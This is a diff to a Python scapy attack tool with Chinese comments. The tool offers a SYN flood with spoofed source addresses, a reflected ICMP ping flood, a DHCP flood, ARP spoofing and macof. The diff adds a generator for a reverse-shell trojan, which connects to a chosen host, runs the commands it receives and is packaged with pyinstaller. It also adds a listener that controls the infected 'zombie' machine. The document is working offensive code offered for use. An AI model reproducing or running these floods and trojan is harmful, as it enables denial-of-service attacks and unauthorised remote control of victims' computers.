@@ -95,8 +95,7 @@ def SYN_flood(): #SYN flood attack SYN洪水不用我说把
 
     while True:#攻击主循环
         try:#一个ctrl + c退出模块自己体会
-            psrc = "%i.%i.%i.%i" %(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))#生成随机IP(伪造IP) PS:可以在数据包生成时把代码简化用RandIP函数,我懒得写。
-            send(IP(src=psrc,dst=target)/TCP(dport=int(port), flags="S"))#生成&发送攻击数据包
+            send(IP(src=RandIP(),dst=target)/TCP(dport=int(port), flags="S"))#生成&发送攻击数据包
         except KeyboardInterrupt:
             break
 
@@ -122,14 +121,14 @@ def DHCP_flood():
     while True:
         try:
             srp(packet)
+            time.sleep(1)
         except KeyboardInterrupt:
             break
 
 def death_ping():
     target = input("Enter the target like 127.0.0.1:")
     while True:
-        pdst = "%i.%i.%i.%i" %(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
-        send(IP(src=target,dst=pdst)/ICMP())
+        send(IP(src=target,dst=RandIP())/ICMP())
 
 def scapy_sniff():
     file = open('iface.setting','r')
@@ -167,6 +166,38 @@ def macof():
         except KeyboardInterrupt:
             break
 
+def Generate_trojan_virus():
+    name = input("Enter virus name:")
+    lhost = input("Enter connect host:")
+    lport = input("Enter connect port:")
+    file = open("virus/" + name + ".py",'w')
+    file.write('import socket, os, time\n')
+    file.write('s = socket.socket()\n')
+    file.write('s.connect(("' + lhost + '",' + lport + '))\n')
+    file.write('while True:\n')
+    file.write('    command = s.recv(2048)\n')
+    file.write('    data = os.popen(command.decode("utf-8")).read()\n')
+    file.write('    if data == "":\n')
+    file.write('        data = "command has no output or has a error."\n')
+    file.write('    s.send(bytes(data,encoding="utf-8"))\n')
+    file.close()
+    os.system("pyinstaller -w -F virus/" + name + ".py")
+
+def countrol_zombie_computer():
+    listen_host = input("Enter the listen host ip like 127.0.0.1:")
+    listen_port = input("Enter the listen port like 80:")
+    s = socket.socket()
+    s.bind((listen_host,int(listen_port)))
+    s.listen(1)
+    print("Wait for connect...")
+    conn,address = s.accept()
+    print("have a new connect from",address[0])
+    while True:
+        command = input("Enter the command:")
+        conn.send(bytes(command,encoding="utf-8"))
+        data = conn.recv(4096)
+        print(data.decode("utf-8"))
+
 print("Setup in ", time.time() - tick, "seconds.")#初始化计时
 while True:#喜闻乐见的主循环
 
@@ -180,6 +211,8 @@ while True:#喜闻乐见的主循环
     print("ARPspoof with not ARPPing(7)")
     print("macof(8)")
     print("DHCP flood(9)")
+    print("Generate trojan virus(10)")
+    print("Control zombie computer(11)")
     print("退出(0)")
     print("ARP欺骗带ARPPing(内网用)。(1)")
     print("SYN洪水(2)")
@@ -190,6 +223,8 @@ while True:#喜闻乐见的主循环
     print("ARP欺骗不带ARPPing版(7)")
     print("伪macof(8)")
     print("DHCP洪水(9)")
+    print("生成木马病毒(10)")
+    print("控制肉鸡(11)")
 
     choose = input(">>>")#用户选择输入
 
@@ -218,5 +253,9 @@ while True:#喜闻乐见的主循环
         macof()
     elif choose == 9:
         DHCP_flood()
+    elif choose == 10:
+        Generate_trojan_virus()
+    elif choose == 11:
+        countrol_zombie_computer()
     else:#如果输入无效就告诉用户输入无效
         print("Don't have this choose")
